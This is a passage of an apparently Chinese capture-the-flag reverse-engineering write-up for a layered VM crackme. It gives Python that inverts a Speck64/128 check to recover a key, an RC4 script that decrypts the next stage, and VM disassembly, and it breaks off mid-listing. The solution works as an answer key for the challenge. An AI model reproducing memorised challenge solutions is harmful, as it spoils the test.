class="keyword">return</span> ((x &gt;&gt; r) | ((x &lt;&lt; (<span class="number">32</span> - r)) &amp; MASK32)) &amp; MASK32</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_round_keys</span>(<span class="params">key_words: <span class="built_in">list</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="built_in">list</span>[<span class="built_in">int</span>]:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Generate 27 round keys for Speck64/128 (matches the VM&#x27;s key schedule).&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    l = <span class="built_in">list</span>(key_words[<span class="number">1</span>:])</span><br><span class="line">    k = key_words[<span class="number">0</span>]</span><br><span class="line">    keys: <span class="built_in">list</span>[<span class="built_in">int</span>] = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUNDS):</span><br><span class="line">        keys.append(k)</span><br><span class="line">        idx = i % (<span class="built_in">len</span>(key_words) - <span class="number">1</span>)</span><br><span class="line">        val = (_ror32(l[idx], <span class="number">8</span>) + k) &amp; MASK32</span><br><span class="line">        val ^= i</span><br><span class="line">        l[idx] = val</span><br><span class="line">        k = (_rol32(k, <span class="number">3</span>) ^ val) &amp; MASK32</span><br><span class="line">    <span class="keyword">return</span> keys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ROUND_KEYS = speck_round_keys(SPECK_KEY_WORDS)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_encrypt_block</span>(<span class="params">block: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    x = block &amp; MASK32</span><br><span class="line">    y = (block &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> ROUND_KEYS:</span><br><span class="line">        x = (_ror32(x, <span class="number">8</span>) + y) &amp; MASK32</span><br><span class="line">        x ^= k</span><br><span class="line">        y = _rol32(y, <span class="number">3</span>) ^ x</span><br><span class="line">    <span class="keyword">return</span> (y &lt;&lt; <span class="number">32</span>) | x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">speck_decrypt_block</span>(<span class="params">block: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    x = block &amp; MASK32</span><br><span class="line">    y = (block &gt;&gt; <span class="number">32</span>) &amp; MASK32</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">reversed</span>(ROUND_KEYS):</span><br><span class="line">        y = _ror32(y ^ x, <span class="number">3</span>)</span><br><span class="line">        x ^= k</span><br><span class="line">        x = _rol32((x - y) &amp; MASK32, <span class="number">8</span>)</span><br><span class="line">    <span class="keyword">return</span> (y &lt;&lt; <span class="number">32</span>) | x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">layer1_forward</span>(<span class="params">user_key: <span class="built_in">int</span></span>) -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Exact logic executed by the first layer before the comparison.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    state = (user_key - CONST_SUB_1) &amp; MASK64</span><br><span class="line">    state ^= CONST_XOR_1</span><br><span class="line">    state = (state - CONST_SUB_2) &amp; MASK64</span><br><span class="line">    state ^= CONST_XOR_2</span><br><span class="line">    <span class="keyword">return</span> speck_encrypt_block(state)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_layer1</span>() -&gt; <span class="built_in">int</span>:</span><br><span class="line">    <span class="string">&quot;&quot;&quot;Invert the layer to retrieve the 64-bit key expected by the VM.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    state = speck_decrypt_block(TARGET_CT)</span><br><span class="line">    state ^= CONST_XOR_2</span><br><span class="line">    state = (state + CONST_SUB_2) &amp; MASK64</span><br><span class="line">    state ^= CONST_XOR_1</span><br><span class="line">    state = (state + CONST_SUB_1) &amp; MASK64</span><br><span class="line">    <span class="keyword">return</span> state</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    key = solve_layer1()</span><br><span class="line">    <span class="keyword">assert</span> layer1_forward(key) == TARGET_CT</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;first key = 0x<span class="subst">&#123;key:016x&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行后得到第三个key</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xa28f38bd0463522c</span><br></pre></td></tr></table></figure><p>一些问题的解释：</p><p>定位首层片段</p><p>虚拟机执行前会用 0x80&#x2F;0x81 idx&#x2F;0x03 建好 call table，每条形如 … 80 01 A4 05 … 81 20 …。python3 disasm_vm.py 0x5a9 0x6f4 这个范围是通过搜索 0x81 0x20 得到 call index 0x20 的入口偏移 full_vmcode:0x05a4，从 setp1 0xe000 (full_vmcode:0x05a9) 起正好是最外层“取第 3 个 key 并处理”的主体，在那里能看到读取 0xE010、一串 mov_imm&#x2F;xor_imm&#x2F;“逐位加法”循环，再写入 0x7200 和 0x7208 后 call 0x20。</p><p>好像是rc4的东西</p><p>python3 disasm_vm.py 0x0116 0x02c0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">0116: setp1 0x7100</span><br><span class="line">0119: storep1 r0</span><br><span class="line">011b: setp1 0x7000</span><br><span class="line">011e: mov_imm r2, 0x0000000000000000</span><br><span class="line">0128: storep1_idx8 r2, r2</span><br><span class="line">012b: inc r2</span><br><span class="line">012d: cmp_imm r2, 0x0000000000000100</span><br><span class="line">0137: jne 0x0128</span><br><span class="line">013a: mov_imm r2, 0x0000000000000000</span><br><span class="line">0144: mov_imm r3, 0x0000000000000000</span><br><span class="line">014e: mov_imm r7, 0x00000000000000ff</span><br><span class="line">0158: setp1 0x7000</span><br><span class="line">015b: loadp1_idx8 r5, r2</span><br><span class="line">015e: mov r4, r2</span><br><span class="line">0161: and_imm r4, 0x0000000000000007</span><br><span class="line">016b: setp1 0x7100</span><br><span class="line">016e: loadp1_idx8 r4, r4</span><br><span class="line">0171: push r6</span><br><span class="line">0173: push r7</span><br><span class="line">0175: mov r6, r5</span><br><span class="line">0178: mov r7, r3</span><br><span class="line">017b: and r7, r6</span><br><span class="line">017e: xor r3, r6</span><br><span class="line">0181: cmp_imm r7, 0x0000000000000000</span><br><span class="line">018b: je 0x0197</span><br><span class="line">018e: shl r7, 0x01</span><br><span class="line">0191: mov r6, r7</span><br><span class="line">0194: jmp 0x0178</span><br><span class="line">0197: and_imm r3, 0xffffffffffffffff</span><br><span class="line">01a1: pop r7</span><br><span class="line">01a3: pop r6</span><br><span class="line">01a5: push r6</span><br><span class="line">01a7: push r7</span><br><span class="line">01a9: mov r6, r4</span><br><span class="line">01ac: mov r7, r3</span><br><span class="line">01af: and r7, r6</span><br><span class="line">01b2: xor r3, r6</span><br><span class="line">01b5: cmp_imm r7, 0x0000000000000000</span><br><span class="line">01bf: je 0x01cb</span><br><span class="line">01c2: shl r7, 0x01</span><br><span class="line">01c5: mov r6, r7</span><br><span class="line">01c8: jmp 0x01ac</span><br><span class="line">01cb: and_imm r3, 0xffffffffffffffff</span><br><span class="line">01d5: pop r7</span><br><span class="line">01d7: pop r6</span><br><span class="line">01d9: and r3, r7</span><br><span class="line">01dc: setp1 0x7000</span><br><span class="line">01df: loadp1_idx8 r6, r3</span><br><span class="line">01e2: storep1_idx8 r6, r2</span><br><span class="line">01e5: storep1_idx8 r5, r3</span><br><span class="line">01e8: inc r2</span><br><span class="line">01ea: cmp_imm r2, 0x0000000000000100</span><br><span class="line">01f4: jne 0x0158</span><br><span class="line">01f7: mov_imm r2, 0x0000000000000000</span><br><span class="line">0201: mov_imm r3, 0x0000000000000000</span><br><span class="line">020b: mov_imm r6, 0x0000000000000000</span><br><span class="line">0215: cmp_imm r1, 0x0000000000000000</span><br><span class="line">021f: je 0x02b7</span><br><span class="line">0222: inc r2</span><br><span class="line">0224: and r2, r7</span><br><span class="line">0227: setp1 0x7000</span><br><span class="line">022a: loadp1_idx8 r5, r2</span><br><span class="line">022d: push r6</span><br><span class="line">022f: push r7</span><br><span class="line">0231: mov r6, r5</span><br><span class="line">0234: mov r7, r3</span><br><span class="line">0237: and r7, r6</span><br><span class="line">023a: xor r3, r6</span><br><span class="line">023d: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0247: je 0x0253</span><br><span class="line">024a: shl r7, 0x01</span><br><span class="line">024d: mov r6, r7</span><br><span class="line">0250: jmp 0x0234</span><br><span class="line">0253: and_imm r3, 0xffffffffffffffff</span><br><span class="line">025d: pop r7</span><br><span class="line">025f: pop r6</span><br><span class="line">0261: and r3, r7</span><br><span class="line">0264: loadp1_idx8 r0, r3</span><br><span class="line">0267: storep1_idx8 r0, r2</span><br><span class="line">026a: storep1_idx8 r5, r3</span><br><span class="line">026d: push r6</span><br><span class="line">026f: push r7</span><br><span class="line">0271: mov r6, r0</span><br><span class="line">0274: mov r7, r5</span><br><span class="line">0277: and r7, r6</span><br><span class="line">027a: xor r5, r6</span><br><span class="line">027d: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0287: je 0x0293</span><br><span class="line">028a: shl r7, 0x01</span><br><span class="line">028d: mov r6, r7</span><br><span class="line">0290: jmp 0x0274</span><br><span class="line">0293: and_imm r5, 0xffffffffffffffff</span><br><span class="line">029d: pop r7</span><br><span class="line">029f: pop r6</span><br><span class="line">02a1: and r5, r7</span><br><span class="line">02a4: loadp1_idx8 r4, r5</span><br><span class="line">02a7: loadp2_idx8 r5, r6</span><br><span class="line">02aa: xor r5, r4</span><br><span class="line">02ad: storep2_idx8 r5, r6</span><br><span class="line">02b0: inc r6</span><br><span class="line">02b2: dec r1</span><br><span class="line">02b4: jmp 0x0215</span><br><span class="line">02b7: ret</span><br><span class="line">02b8: store_call 0x10</span><br><span class="line">02ba: save_pc</span><br><span class="line">02bb: jmp 0x05a4</span><br><span class="line">02be: push r0</span><br></pre></td></tr></table></figure><p>同时</p><p><img src="https://matriy.oss-cn-beijing.aliyuncs.com/202511182036161.png" alt="image-20251118203633026"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0715: mov r0, r5          ; 恢复原始 key</span><br><span class="line">0718: setp2 0x072a         ; 目标缓冲 = 0x072a</span><br><span class="line">071b: mov_imm r1, 0x6057   ; 长度 0x6057 字节</span><br><span class="line">0725: call 0x10           ; 调用 index 0x10 的子程序</span><br><span class="line">0727: jmp 0x072a          ; 跳进刚写出来的新代码</span><br></pre></td></tr></table></figure><blockquote><p>call 0x10 的实现就在 full_vmcode:0x0200–0x02b7（用 python3 disasm_vm.py 0x0200 0x02c0 能看到完整指令），它是一个标准的 RC4 PRGA</p></blockquote><p>在进入 VM 后的初始化（full_vmcode:0x0116–0x01f7）里，先把 0x7000 处的 S 盒置成 0…255，再用 0x7100 的 8 字节 key 做 RC4 KSA。寄存器在 sub_171D0 里全部 memset 成 0，所以 r0 起始为 0，setp1 0x7100; storep1 r0 把 8 个 0 写进 key 区，等价于一个 8 字节全 0 的 RC4 密钥。</p><p>call 0x10 里能看到典型的 PRGA：r2 &#x3D; (r2+1)&amp;0xFF，r3 &#x3D; (r3+S[i])&amp;0xFF，交换 S[i]&#x2F;S[j]，取 keystream byte S[(S[i]+S[j])&amp;0xFF]，最后与 ptr2 指向的密文异或，把结果写回 ptr2。循环次数就是 r1 &#x3D; 0x6057。</p><p>那段 call 0x10 不是随便 XOR，而是一个 RC4 解密器。它在入口（full_vmcode:0x0116）把当前 r0 写到 0x7100 作为 8 字节密钥，然后做 KSA&#x2F;PRGA 去 XOR ptr2 指向的密文。第一层通过校验后会把原始 key 放回 r0（0x0715: mov r0, r5），所以 RC4 的密钥其实就是我们刚算出的第一层 key 0xA28F38BD0463522C。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x072a</span></span><br><span class="line">length = <span class="number">0x6057</span></span><br><span class="line">full = Path(<span class="string">&quot;full_vmcode&quot;</span>).read_bytes()</span><br><span class="line">enc = full[start:start+length]</span><br><span class="line">key = (<span class="number">0xA28F38BD0463522C</span>).to_bytes(<span class="number">8</span>, <span class="string">&quot;little&quot;</span>)</span><br><span class="line"></span><br><span class="line">S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>)); j = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">    j = (j + S[i] + key[i % <span class="built_in">len</span>(key)]) &amp; <span class="number">0xFF</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">i = j = <span class="number">0</span></span><br><span class="line">out = <span class="built_in">bytearray</span>(length)</span><br><span class="line"><span class="keyword">for</span> idx <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">    i = (i + <span class="number">1</span>) &amp; <span class="number">0xFF</span></span><br><span class="line">    j = (j + S[i]) &amp; <span class="number">0xFF</span></span><br><span class="line">    S[i], S[j] = S[j], S[i]</span><br><span class="line">    k = S[(S[i] + S[j]) &amp; <span class="number">0xFF</span>]</span><br><span class="line">    out[idx] = enc[idx] ^ k</span><br><span class="line"></span><br><span class="line">Path(<span class="string">&quot;stage2.bin&quot;</span>).write_bytes(out)</span><br></pre></td></tr></table></figure><p>python3 disasm_vm.py 0 0x200 stage2.bin</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">0000: setp1 0xe000</span><br><span class="line">0003: loadp1_off r0, 0x0008</span><br><span class="line">0007: mov r5, r0</span><br><span class="line">000a: xor_imm r0, 0x95714c91bc8b306f</span><br><span class="line">0014: xor_imm r0, 0x4303f92241dd9a9f</span><br><span class="line">001e: xor_imm r0, 0x311e18c91413b58c</span><br><span class="line">0028: push r5</span><br><span class="line">002a: mov_imm r5, 0x8df6073d0dbbff09</span><br><span class="line">0034: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">003e: push r6</span><br><span class="line">0040: push r7</span><br><span class="line">0042: mov_imm r6, 0x0000000000000001</span><br><span class="line">004c: mov r7, r5</span><br><span class="line">004f: and r7, r6</span><br><span class="line">0052: xor r5, r6</span><br><span class="line">0055: cmp_imm r7, 0x0000000000000000</span><br><span class="line">005f: je 0x0795</span><br><span class="line">0062: shl r7, 0x01</span><br><span class="line">0065: mov r6, r7</span><br><span class="line">0068: jmp 0x0776</span><br><span class="line">006b: pop r7</span><br><span class="line">006d: pop r6</span><br><span class="line">006f: push r6</span><br><span class="line">0071: push r7</span><br><span class="line">0073: mov r6, r5</span><br><span class="line">0076: mov r7, r0</span><br><span class="line">0079: and r7, r6</span><br><span class="line">007c: xor r0, r6</span><br><span class="line">007f: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0089: je 0x07bf</span><br><span class="line">008c: shl r7, 0x01</span><br><span class="line">008f: mov r6, r7</span><br><span class="line">0092: jmp 0x07a0</span><br><span class="line">0095: and_imm r0, 0xffffffffffffffff</span><br><span class="line">009f: pop r7</span><br><span class="line">00a1: pop r6</span><br><span class="line">00a3: and_imm r0, 0xffffffffffffffff</span><br><span class="line">00ad: pop r5</span><br><span class="line">00af: push r5</span><br><span class="line">00b1: mov_imm r5, 0xee5744efe81e97b7</span><br><span class="line">00bb: xor_imm r5, 0xffffffffffffffff</span><br><span class="line">00c5: push r6</span><br><span class="line">00c7: push r7</span><br><span class="line">00c9: mov_imm r6, 0x0000000000000001</span><br><span class="line">00d3: mov r7, r5</span><br><span class="line">00d6: and r7, r6</span><br><span class="line">00d9: xor r5, r6</span><br><span class="line">00dc: cmp_imm r7, 0x0000000000000000</span><br><span class="line">00e6: je 0x081c</span><br><span class="line">00e9: shl r7, 0x01</span><br><span class="line">00ec: mov r6, r7</span><br><span class="line">00ef: jmp 0x07fd</span><br><span class="line">00f2: pop r7</span><br><span class="line">00f4: pop r6</span><br><span class="line">00f6: push r6</span><br><span class="line">00f8: push r7</span><br><span class="line">00fa: mov r6, r5</span><br><span class="line">00fd: mov r7, r0</span><br><span class="line">0100: and r7, r6</span><br><span class="line">0103: xor r0, r6</span><br><span class="line">0106: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0110: je 0x0846</span><br><span class="line">0113: shl r7, 0x01</span><br><span class="line">0116: mov r6, r7</span><br><span class="line">0119: jmp 0x0827</span><br><span class="line">011c: and_imm r0, 0xffffffffffffffff</span><br><span class="line">0126: pop r7</span><br><span class="line">0128: pop r6</span><br><span class="line">012a: and_imm r0, 0xffffffffffffffff</span><br><span class="line">0134: pop r5</span><br><span class="line">0136: push r6</span><br><span class="line">0138: push r7</span><br><span class="line">013a: mov_imm r6, 0xf8a82a8dbdb78c3f</span><br><span class="line">0144: mov r7, r0</span><br><span class="line">0147: and r7, r6</span><br><span class="line">014a: xor r0, r6</span><br><span class="line">014d: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0157: je 0x088d</span><br><span class="line">015a: shl r7, 0x01</span><br><span class="line">015d: mov r6, r7</span><br><span class="line">0160: jmp 0x086e</span><br><span class="line">0163: pop r7</span><br><span class="line">0165: pop r6</span><br><span class="line">0167: push r6</span><br><span class="line">0169: push r7</span><br><span class="line">016b: mov_imm r6, 0x58e8abfc7618f5fd</span><br><span class="line">0175: mov r7, r0</span><br><span class="line">0178: and r7, r6</span><br><span class="line">017b: xor r0, r6</span><br><span class="line">017e: cmp_imm r7, 0x0000000000000000</span><br><span class="line">0188: je 0x08be</span><br><span class="line">018b: shl r7, 0x01</span><br><span class="line">018e: mov r6, r7</span><br><span class="line">0191: jmp 0x089f</span><br><span class="line">0194: pop r7</span><br><span class="line">0196: pop r6</span><br><span class="line">0198: xor_imm r0, 0x99d88c4fa4cc68aa</span><br><span class="line">01a2: setp1 0x7200</span><br><span class="line">01a5: mov_imm r1, 0x8d85b3156df9f721</span><br><span class="line">01af: storep1 r1</span><br><span class="line">01b1: push r0</span><br><span class="line">01b3: mov_imm r0, 0x0000000000000008</span><br><span class="line">01bd: addp1_reg r0</span><br><span class="line">01bf: pop r0</span><br><span class="line">01c1: mov_imm r1, 0x28e3d33340bc0884</span><br><span class="line">01cb: storep1 r1</span><br><span class="line">01cd: setp1 0x7200</span><br><span class="line">01d0: call 0x20</span><br><span class="line">01d2: cmp_imm r0, 0x659391a5dc3522b3</span><br><span class="line">01dc: je 0x090c</span><br><span class="line">01df: call 0x01</span><br><span class="line">01e1: halt</span><br><span class="line">01e2: mov r0, r5</span><br><span class="line">01e5: setp2 0x0921</span><br><span class="line">01e8: mov_imm r1, 0x0000000000005e60</span><br><span class="line">01f2: call 0x10</span><br><span class="line">01f4: jmp 0x0921</span><br><span class="line">01f7: .byte 0xbc</span><br><span class="line">01f8: .byte 0x38</span><br><span class="line">01f9: .byte 0xcd</span><br><span class="line">01fa: .byte 0x98</span><br><span class="line">01fb: .byte 0xe7</span><br><span class="line">01fc: addp1_reg r5</span><br><span class="line">01fe: .byte 0x49</span><br><span class="line">01ff: push r136</span><br></pre></td></tr></table></figure><p>可以看到第二层流程几乎与第一层一致：取 key[1]（偏移 0xE008），依次 XOR&#x2F;减去几个 64 位常量，最后 XOR 0x99d8…，把新的 Speck 代码写到 0x7200。然后同样 call 0x20（Speck64&#x2F;128，密钥改成 0x8d85b3156df9f721 || 0x28e3d33340bc0884），比较 r0 是否等于 0x659391A5DC3522B3，通过后恢复原始<br>key，调用 call 0x10 以该 key 为 RC4 密钥，再去解 0x5E60 字节的第三层。</p><p>第二层和第一层一样，只是换了一组可逆算子和 Speck 密钥。把第一层 key（0xA28F38BD0463522C）当成 RC4 密钥再跑 call 0x10，0x072a 开始的 0x6057 字节就会解成 stage2.bin，从头的指令能读出下面的管线：</p><ul><li>setp1 0xE000; loadp1_off r0, 0x0008 取第 2 个 64-bit key。</li><li>依次执行 3 次 XOR（0x95714C91BC8B306F, 0x4303F92241DD9A9F, 0x311E18C91413B58C）。</li><li>两次“sub gadget”把 0x8DF6073D0DBBFF09、0xEE5744EFE81E97B7 从寄存器里减掉（跟第一层一样是先取补码再加）。</li><li>两次“add gadget”把 0xF8A82A8DBDB78C3F、0x58E8ABFC7618F5FD 加回去（这次不做补码，所以是加法）。</li><li>再 XOR 0x99D88C4FA4CC68AA。</li><li>像上一层一样在 0x7200&#x2F;0x7208 写入 Speck64&#x2F;128 的新 key（小端拆成 [0x6DF9F721, 0x8D85B315, 0x40BC0884, 0x28E3D333]），call 0x20，比较 r0 是否等于 0x659391A5DC3522B3，成功后把原 key 放回 r0，用它做 RC4 解出下一层。</li></ul><p>把这一套流程都编码进了 test1.py，现在它既能描述第一层，也能逆出第二层。直接运行脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span 